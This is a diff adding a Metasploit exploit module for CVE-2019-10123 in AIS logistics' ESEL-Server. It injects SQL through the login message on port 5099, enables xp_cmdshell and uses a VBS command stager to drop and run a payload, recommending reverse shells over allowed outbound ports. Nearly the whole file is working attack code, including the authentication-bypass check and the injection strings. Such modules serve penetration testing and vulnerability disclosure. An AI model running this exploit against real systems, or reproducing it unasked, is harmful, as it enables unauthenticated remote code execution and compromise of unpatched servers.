@@ -1,0 +1,135 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::MSSQL_COMMANDS
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'AIS logistics ESEL-Server Unauth SQL Injection RCE',
+      'Description'    => %q{
+        This module will execute an arbitrary payload on an "ESEL" server used by the
+        AIS logistic software. The server typically listens on port 5099 without TLS.
+        There could also be server listening on 5100 with TLS but the port 5099 is
+        usually always open.
+        The login process is vulnerable to an SQL Injection. Usually a MSSQL Server
+        with the 'sa' user is in place.
+
+        This module was verified on version 67 but it should also run on lower versions.
+        An fixed version was created by AIS in September 2017. However most systems
+        have not been updated.
+
+        In regard to the payload, unless there is a closed port in the web server,
+        you dont want to use any "bind" payload. You want a "reverse" payload,
+        probably to your port 80 or to any other outbound port allowed on the firewall.
+
+        Currently, one delivery method is supported
+
+        This method takes advantage of the Command Stager subsystem. This allows using
+        various techniques, such as using a TFTP server, to send the executable. By default
+        the Command Stager uses 'wcsript.exe' to generate the executable on the target.
+
+        NOTE: This module will leave a payload executable on the target system when the
+        attack is finished.
+
+      },
+      'Author'         =>
+        [
+          'Manuel Feifel'
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['CVE', '2019-10123'],
+        ],
+      'Platform'       => 'win',
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'Payload'        =>
+        {
+          'BadChars'  => "\x00\xff\x27",
+        },
+      'Targets'        =>
+        [
+          [ 'Automatic', { } ],
+        ],
+      'CmdStagerFlavor' => 'vbs',
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => '2019-03-27',
+      'DefaultOptions' =>
+        {
+          'RPORT' => 5099
+        },
+      ))
+  end
+
+  # This is method required for the CmdStager to work...
+  def execute_command(cmd, _opts)
+    cmd_xp = "EXEC master..xp_cmdshell '#{cmd}'"
+    send_login_msg(create_login_msg_sql(cmd_xp))
+  end
+
+  # prepends the required length to the message and sends it to the server
+  def send_login_msg(login_msg, check_response = true)
+    length = login_msg.length
+    length += length.to_s.length
+    login_msg = "#{length}#{login_msg}"
+
+    connect
+
+    sock.put(login_msg)
+    response = sock.recv(10000)
+
+    if check_response
+      if (response.include? 'Zugangsdaten Falsch') && (response.length > (length - 20))
+        print_good('Correct response received => Data send successfully')
+      else
+        print_warning('Wrong response received => Probably data could not be sent successfully')
+      end
+    end
+
+    return response
+  ensure
+    # Every time a new Connection is required
+    disconnect
+  end
+
+  # embeds a sql command into the login message
+  def create_login_msg_sql(sql_cmd)
+    return create_login_msg("#{rand(1_000..9_999)}'; #{sql_cmd}--")
+  end
+
+  # create a plain login message
+  def create_login_msg(pw)
+    delim = "\xFF"
+    login_str = "#{delim}000000#{delim}20180810213226#{delim}01#{delim}60"\
+                "#{delim}02#{delim}1111#{delim}#{pw}#{delim}AAAAA#{delim}120"
+
+  end
+
+  def check
+    int = rand(1..1_000)
+    response_bypass = send_login_msg(create_login_msg("#{rand(1_000..9_999)}' OR #{int}=#{int}--"), false)
+    if response_bypass.include? 'Zugangsdaten OK'
+      CheckCode::Vulnerable
+    else
+      print_status("Response was: #{response_bypass}")
+      CheckCode::Safe
+    end
+  end
+
+  def exploit
+    # enable xp cmdshell, used to execute commands later
+    # Software uses the 'sa' user by default
+    send_login_msg(create_login_msg_sql(mssql_xpcmdshell_enable))
+    # The porotocol has no limites on max-data
+    execute_cmdstager({ :linemax => 1500 })
+    print_warning('The payload is left on the client in the \%TEMP\% Folder of the corresponding user.')
+    print_status('Stager should now be executed.')
+  end
+end
